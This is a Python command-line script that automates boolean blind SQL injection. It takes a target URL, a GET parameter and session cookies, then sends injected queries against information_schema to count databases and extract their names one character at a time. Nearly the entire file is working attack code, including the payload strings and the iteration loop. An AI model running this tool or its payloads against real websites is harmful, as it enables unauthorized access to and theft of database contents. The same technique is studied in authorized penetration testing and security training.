import sys
import argparse
import requests
from colorama import init, Fore
import re
import time
import string

def init_parser() -> argparse.ArgumentParser:
    '''Initialize argument parser.
    
    Returns:
        - `ArgumentParser` with configured arguments
    '''
    parser = argparse.ArgumentParser(
        description="Simple program to detect Blind-based SQL Injections."
    )
    parser.add_argument('-u', '--url', type=str, help='SQL Injection whole URL', nargs='?', default='', required=True)
    parser.add_argument('-g', '--get-param', type=str, help='GET parameter', nargs='?', default='', required=True)
    parser.add_argument(
        '-c',
        '--cookies',
        type=lambda x: { k:v for k,v in (i.split('=') for i in x.split(',')) },
        help='Cookies to set, divided by commas')

    return parser


def check_authentication(url, cookies={'':''}) -> int:
    '''
    Check arguments and ask the user if the site is the final site desired.
    
    Arguments:
        - `url`: site the user wants to access.
        - `cookies`: cookies of the user session to be able to access the URL.

    Returns:
        - `int`: 0 or 1 if the user has been able to access the correct URL, trusting on his input.
    '''
    print(Fore.CYAN + 'Trying to access the URL ...')
    time.sleep(0.5)
    
    request_text = requests.get(url, cookies=cookies).text
    title_pattern = r'<title>.+</title>'
    title_found = re.search(title_pattern, request_text)
    
    print(Fore.YELLOW + 'The title of the site being accessed is:')
    print(Fore.WHITE + f"\t{title_found.group(0)}")
    print(Fore.YELLOW + 'Is this correct?\nIf not, you might need to provide the cookie to be able to access the URL')

    user_answer = input('[Y/n] ')
    if re.search(r'([^y|^Y])', user_answer):
        return 1
    
    return 0


def identify_vulnerability(url, get_param, cookies={'':''}) -> int:
    '''
    Identify the Blind-based SQL Injection in the given URL, using the given GET parameter and the given cookies, if needed.
    
    Arguments:
        - `url`: site the user wants to access.
        - `get_param`: GET parameter to check if its injectable.
        - `cookies`: cookies of the user session to be able to access the URL.

    Returns:
        - `int`: 0 if the URL is vulnerable, 1 if it is not vulnerable to Blind-based SQL injection.
    '''
    print(Fore.CYAN + 'Analyzing the URL and the GET parameter you provided ...')
    time.sleep(0.75)

    request_text = requests.get(url, cookies=cookies).text
    param_pattern = rf'<input.+ name=([\'"]){re.escape(get_param)}\1>'
    param_found = re.search(param_pattern, request_text)
    if not param_found:
        return 1
    
    return 0


def iterative_request(url, get_param, cookies, payload, is_char=False) -> int|str:
    '''
    Iterate on the payload given into an specific site to determine whether a 200 code is displayed.
    
    Arguments:
        - `url`: site the user wants to access.
        - `get_param`: GET parameter to check if its injectable.
        - `cookies`: cookies of the user session to be able to access the URL.
        - `payload`: string to inject.
        - `is_char`: boolean to know if the request iterates on characters or on numbers.

    Returns:
        - `int` or `str`: The number or character limit at which a 200 status code is displayed.
    '''
    found = False
    limit = 0
    result_value = None

    while not found:
        limit += 10
        for value in (string.ascii_lowercase + '_') if is_char else range(limit):
            new_payload =  str(payload.replace('iterate', '\'{}\'')).format(value) if is_char else str(payload.replace('iterate', '{}')).format(value)
            data = { f"{get_param}": new_payload, }
            request = requests.get(url, params=data, cookies=cookies)
            if request.status_code == 200:
                found = True
                result_value = value
            if found: break
    return result_value


def identify_db(url, get_param, cookies):
    '''
    Identify the number and names of the databases.
    
    Arguments:
        - `url`: site the user wants to inject.
        - `get_param`: GET parameter to be injected.
        - `cookies`: cookies of the user session to be able to access the URL.
    '''
    print(Fore.CYAN + 'Identifying databases ...')
    time.sleep(0.75)
    
    payload = "1' and (select count(schema_name) from information_schema.schemata)=iterate -- -"
    n_database = iterative_request(url, get_param, cookies, payload)
    print(Fore.LIGHTGREEN_EX + f"The number of databases is {n_database}")

    for i in range(n_database):
        print(Fore.LIGHTCYAN_EX + f"\t>>> Database {i+1} ...")
        if (i == 0):
            print(Fore.YELLOW + 'Skipping INFORMATION_SCHEMA ...')
            continue
        payload = "1' and (select length(schema_name) from information_schema.schemata limit {},1)=iterate -- -".format(i)
        length_db = iterative_request(url, get_param, cookies, payload)
        print(Fore.LIGHTCYAN_EX + f"\t>>>>> LENGTH: {length_db}")
        
        db_name = ''
        for n_char in range(length_db):
            payload = "1' and substring((select schema_name from information_schema.schemata limit {},1),{},1)=iterate -- -".format(i, n_char+1)
            db_name += iterative_request(url, get_param, cookies, payload, is_char=True)
        print(Fore.LIGHTCYAN_EX + f"\t>>>>> NAME: {db_name}")
        

def main() -> int:
    init(autoreset=True)
         
    '''Initial check.'''
    parser=init_parser()
    args=parser.parse_args()

    try:
        code = check_authentication(args.url, args.cookies)
        if code == 1:
            print(Fore.RED + '\nYou might need a cookie to continue with the exploitation.\n')
            return 1
        print(Fore.GREEN + "Site reached!  Let's continue with the adventure ...\n")

        '''Identify and extract vulnerabilities.'''
        code = identify_vulnerability(args.url, args.get_param, args.cookies)
        if code == 1:
            print(Fore.RED + f"Sorry, the URL you provided is not injectable through the GET parameter `{args.get_param}`")
            return 1
        print(Fore.GREEN + f"Your URL is vulnerable to Blind SQL Injection and the `{args.get_param}` GET parameter is injectable!\n")
        
        '''Extract information from the database (default behaviour).'''
        # TODO: depending on the input of the user, by default extract databases of the site
        identify_db(args.url, args.get_param, args.cookies)

        print(Fore.GREEN + '\nDatabase recognition finished!!')
    except Exception as err:
        print(Fore.LIGHTRED_EX + f"Unexpected {err=}, {type(err)=}")
        return 1

    return 0

   
if __name__ == '__main__':
    sys.exit(main())
